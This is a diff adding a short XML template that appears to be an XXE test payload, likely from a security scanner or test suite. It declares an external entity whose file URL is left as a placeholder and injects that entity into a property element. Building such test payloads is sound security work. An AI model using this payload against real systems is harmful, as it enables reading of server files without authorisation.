@@ -1,0 +1,9 @@
+<?xml version="1.0"?>
+<!DOCTYPE document [
+    <!-- placeholder for the attacked file url -->
+    <!ENTITY xxe SYSTEM "%s" >
+]>
+<document>
+    <!-- the external entity is replaced with the injected value -->
+    <property>&xxe;</property>
+</document>
